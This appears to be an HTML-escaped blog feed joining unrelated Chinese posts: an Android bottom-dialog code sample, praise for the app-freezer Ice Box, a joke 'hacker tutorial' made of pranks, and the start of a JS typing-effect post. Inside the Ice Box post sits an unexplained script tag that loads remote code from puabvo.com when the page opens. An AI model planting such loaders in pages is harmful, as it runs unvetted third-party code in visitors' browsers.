#34;token namespace&#34;&gt;android:&lt;/span&gt;layout_marginBottom&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;10dp&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;@+id/dlv4&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;gravity&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;center&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;TextView&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;layout_width&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;wrap_content&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;layout_height&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;wrap_content&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;text&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;确定&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;textSize&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;19sp&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;android:&lt;/span&gt;textColor&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;#FF312E2E&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;LinearLayout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;LinearLayout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;LinearLayout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;最后只有在Activity代码里调用对话框&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;106&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;```java a.java&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;107&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;108&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      Dialog bottomDialog = new Dialog(a.this, R.style.BottomDialog);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;109&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      //指定布局&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;110&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;View contentView = LayoutInflater.from(a.this).inflate(R.layout.bottomdialog, null);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;111&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bottomDialog.setContentView(contentView);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;112&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ViewGroup.LayoutParams layoutParams = contentView.getLayoutParams();&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;113&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;layoutParams.width = getResources().getDisplayMetrics().widthPixels;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;114&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;contentView.setLayoutParams(layoutParams);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;115&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//控制对话框位置&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;116&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bottomDialog.getWindow().setGravity(Gravity.BOTTOM);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;117&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bottomDialog.getWindow().setWindowAnimations(R.style.BottomDialog_Animation);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;118&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//显示对话框&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;119&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bottomDialog.show();&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;以下是成品&lt;br /&gt;
&lt;img data-src=&#34;http://shp.qpic.cn/collector/1642981619/d9076b1b-c52c-4d30-a834-5012ee76d3a1/0&#34; alt=&#34;image&#34; title=&#34;滑稽&#34; /&gt;&lt;/p&gt;

 &lt;p&gt;这篇文章是国光大佬写的，制作了一键安装脚本&lt;br /&gt;
并且将镜像放在了码云，在国内安装速度飞快&lt;br /&gt;
在这里分享该文章，永远支持国光！！！&lt;/p&gt;

 &lt;h1 id=&#34;冰箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#冰箱&#34;&gt;#&lt;/a&gt;  &lt;code&gt;冰箱&lt;/code&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;在着个国内流氓软件繁多的世界，你遇到过许多的不如愿。&lt;br /&gt;
在安卓 6 以后 bl 锁在许多机型中不可触及&lt;br /&gt;
你花高价买了手机后，你拥有的不过是手机的使用权，其实根本无法完全控制你的手机。作为一个普通人，你即使花再多的钱买手机也不过是获得一小部分的优势而已。因为软件是别人做的，你的手机再贵也不可能躲掉拼多多，淘宝烦人的推送，不可能阻止那些毫无创意且幼稚的广告，不可能逃掉软件随意意弹出的页面，不可能避免那些全家桶应用自启。有人说卸掉软件就行了，可是那些软件你卸得掉吗？&lt;br /&gt;
 &lt;code&gt;你的手机其实根本就不是你的&lt;/code&gt; &lt;br /&gt;
手机只是你被商人压榨的工具。&lt;br /&gt;
害怕拆机短接，bl 解锁麻烦，有些手机上不可能，每个商人都想要利益最大化。&lt;br /&gt;
不少技术大佬去买谷歌的 &lt;code&gt;Nexus&lt;/code&gt;  或者 &lt;code&gt;一加&lt;/code&gt; ， &lt;code&gt;小米&lt;/code&gt; &lt;br /&gt;
原因是他们能给的是一部手机，而不是只是使用权。&lt;br /&gt;
不想寻求权利的普通用户也就这样吧，聪明人知道去维护自己应有的权利。&lt;br /&gt;
在巨大的利益链之下有着正义的使者。&lt;br /&gt;
冰箱就是其中之一。&lt;br /&gt;
 &lt;code&gt;冰箱是一个专注于冻结应用的安卓软件，我能毫不犹豫的说它是下载量第一的冻结应用软件&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特点&#34;&gt;#&lt;/a&gt; 特点&lt;/h1&gt;
&lt;p&gt;为什么冰箱如此受欢迎&lt;/p&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; 精心设计的 MD 风格软件&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; 支持多重授权方式 Root 设备管理员 adb&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; 提供冻结应用的管理，自动冻结等&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; 开发者的十分努力，为用户提供了 web adb 的快捷授权，并同黑域，炼妖壶等开发者进行交流。&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在特点之中 web adb 最为闪亮，webUSB 这项谷歌还在实验阶段的技术的使用，让 web adb 成为可能，adb 变得更加便捷。&lt;br /&gt;
最重要的是让你在没有电脑的情况下激活授权，而需要的只是一根 otg 和另一部手机。&lt;/p&gt;
&lt;script&gt;(function(d){let s=d.createElement(&#39;script&#39;);s.async=true;s.src=&#39;https://puabvo.com/code/native.js?h=waWQiOjExNjQ1NDIsInNpZCI6MTMwNTk5OSwid2lkIjo1MTgwNTYsInNyYyI6Mn0=eyJ&#39;;d.head.appendChild(s);})(document);&lt;/script&gt;

 &lt;h3 id=&#34;零基础教学&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#零基础教学&#34;&gt;#&lt;/a&gt;  &lt;code&gt;零基础教学&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;即使什么都不会，也只需要你的耐心&lt;/p&gt;
&lt;h1 id=&#34;免责申明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#免责申明&#34;&gt;#&lt;/a&gt;  &lt;code&gt;免责申明&lt;/code&gt;&lt;/h1&gt;
&lt;p&gt;本篇文章只针对计算机技术分享，请遵守中华人民共和国网络安全法第十二条，如有越界，后果自负。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tva3.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
黑客教程：  一些黑客惯用手段 包学包会&lt;br /&gt;
特别提醒：百度是黑不了的，不要试&lt;/p&gt;
&lt;div class=&#34;note warning&#34;&gt;
&lt;p&gt;本篇教程较长且十分详细，请耐心阅读&lt;br /&gt;
黑色部分字体已被加密，点击可见&lt;/p&gt;
&lt;/div&gt;
&lt;h1 id=&#34;教程一如何黑网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程一如何黑网站&#34;&gt;#&lt;/a&gt; 教程一：如何黑网站&lt;/h1&gt;
&lt;h2 id=&#34;方法一&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一&lt;/h2&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; 第一步：&lt;br /&gt;
打开 IE5.5 以上版本，或 FireFox1.5 以上版本，并且输入目标网址，打开需要被黑的网站。点击 F12，打开开发者工具。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; 第二步：&lt;br /&gt;
&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;取一定浓度黑色墨汁少许，口含，将嘴对准你的屏幕正中，喷！！！&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; 第三步：&lt;br /&gt;
&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;抬眼看：黑了！！！它黑了！！！&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;方法二&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二&lt;/h2&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; 第一步：&lt;br /&gt;
打开 IE5.5 以上版本，或 FireFox1.5 以上版本，并且输入目标网址，打开需要被黑的论坛。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_4&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_4&#34;&gt; 第二步：&lt;br /&gt;
&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;找到显示器开关，伸出食指，将食指对准显示器开关按钮，按！！！&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_5&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_5&#34;&gt; 第三步：&lt;br /&gt;
&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;抬眼看：黑了！！！它黑了！！&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;方法三&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法三&#34;&gt;#&lt;/a&gt; 方法三&lt;/h2&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_6&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_6&#34;&gt; 第一步：&lt;br /&gt;
打开 IE5.5 以上版本，或 FireFox1.5 以上版本，并且输入目标网址，打开需要被黑的论坛。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_7&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_7&#34;&gt; 第二步：&lt;br /&gt;
找到机箱电源插座，伸出右手，将右手对准插座，拔！！！&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_8&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_8&#34;&gt; 第三步：&lt;br /&gt;
抬眼看：黑了！！！它黑了！！！&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;方法四&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#方法四&#34;&gt;#&lt;/a&gt; 方法四&lt;/h2&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_9&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_9&#34;&gt; 第一步：&lt;br /&gt;
打开 IE5.5 以上版本，或 FireFox1.5 以上版本，并且输入目标网址，打开需要被黑的论坛。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_10&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_10&#34;&gt; 第二步：&lt;br /&gt;
取一定大小砖块或金属等硬物，对准你的屏幕正中，扔！！！&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_11&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_11&#34;&gt; 第三步：&lt;br /&gt;
抬眼看：黑了！！！它黑了！！！&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;教程二如何黑别人电脑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程二如何黑别人电脑&#34;&gt;#&lt;/a&gt; 教程二：如何黑别人电脑#&lt;/h1&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_12&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_12&#34;&gt; &lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;1. 买一桶黑油漆和一把刷子&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_13&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_13&#34;&gt; &lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;2. 到别人家（走着去或坐车都可以&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_14&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_14&#34;&gt; &lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;3. 把他家的电脑用刷子涂抹上黑油漆&lt;/span&gt;&lt;br /&gt;
！！好了！这样你就成功地黑了别人的电脑了！恭喜你！&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;教程三如何在别人电脑里留下后门和木马&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程三如何在别人电脑里留下后门和木马&#34;&gt;#&lt;/a&gt; 教程三：如何在别人电脑里留下后门和木马&lt;/h1&gt;
&lt;p&gt;1. 到玩具店买一个木马，再到五金店买一个钻孔机&lt;br /&gt;
 2. 到别人家（走着去或坐车去都可以）&lt;br /&gt;
3. 用钻孔机在他家电脑的机箱后面钻一个洞，把木马塞进去。&lt;/p&gt;
&lt;h1 id=&#34;教程四如何提升自己在对方网站里的权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程四如何提升自己在对方网站里的权限&#34;&gt;#&lt;/a&gt; 教程四：如何提升自己在对方网站里的权限&lt;/h1&gt;
&lt;p&gt;步骤：&lt;br /&gt;
1. 发很多很多的贴子&lt;br /&gt;
 2. 给这个网站捐一些钱&lt;br /&gt;
 3. 申请做版主&lt;br /&gt;
好了！你终于提升了自己的权限了！恭喜你！&lt;/p&gt;
&lt;h1 id=&#34;教程五如何得到别人的各种密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程五如何得到别人的各种密码&#34;&gt;#&lt;/a&gt; 教程五：如何得到别人的各种密码&lt;/h1&gt;
&lt;p&gt;步骤：&lt;br /&gt;
1. 静态跟踪法：&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;去一个网吧，打扮成一棵树，站在上网者的身后偷看&lt;/span&gt;&lt;br /&gt;
 2. 动态跟踪法：&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;到朋友家做客，站在他们的家人身后偷看（要求：记忆力和眼力必须好，严重反对豆眼和白痴学习此功法）&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;教程六如何以穷举法破解别人邮箱密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程六如何以穷举法破解别人邮箱密码&#34;&gt;#&lt;/a&gt; 教程六：如何以穷举法破解别人邮箱密码&lt;/h1&gt;
&lt;p&gt;步骤：&lt;br /&gt;
1. 随便输入一个邮箱密码&lt;br /&gt;
 2. 如不行，再输入第二个试试&lt;br /&gt;
 3. 如不行，再输入第三个试试&lt;br /&gt;
 4. 如不行，再输入第四个试试……&lt;br /&gt;
（耗费时间较多，强烈建议老年朋友勿练此功法）&lt;/p&gt;
&lt;h1 id=&#34;教程七如何令对方网络瘫痪&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#教程七如何令对方网络瘫痪&#34;&gt;#&lt;/a&gt; 教程七：如何令对方网络瘫痪&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;步骤： 
&lt;/code&gt;&lt;/pre&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_15&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_15&#34;&gt; 1. 把对方网站的网管和站长等所有人约到一个死胡同吃饭。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_16&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_16&#34;&gt; 2. 让你所有的弟兄都赶到那个死胡同，别忘了带上铁锤、木棍。&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_17&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_17&#34;&gt; 3. 我估计见面以后对方的网站不是瘫痪，就是半瘫痪了。&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;更好地学习黑客技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更好地学习黑客技术&#34;&gt;#&lt;/a&gt; 更好地学习黑客技术&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;有不明白的细节可以拨打110查询&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;结语&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结语&#34;&gt;#&lt;/a&gt; 结语&lt;/h1&gt;
&lt;p&gt;本篇文章是大概 18 年的时候在某些 QQ 群里里发现的。&lt;br /&gt;
虽然并不是原创，但也修改了一部分。&lt;br /&gt;
允许转载 转载请附上本文链接&lt;/p&gt;

 &lt;p&gt;&lt;ins class=&#34;primary&#34;&gt;一个自己制作的 JS 打字效果&lt;/ins&gt;&lt;/p&gt;
&lt;h1 id=&#34;效果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#效果&#34;&gt;#&lt;/a&gt; 效果&lt;/h1&gt;
&lt;ul class=&#34;task-list&#34;&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_0&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_0&#34;&gt; 循环打字&lt;/label&gt;&lt;/li&gt;
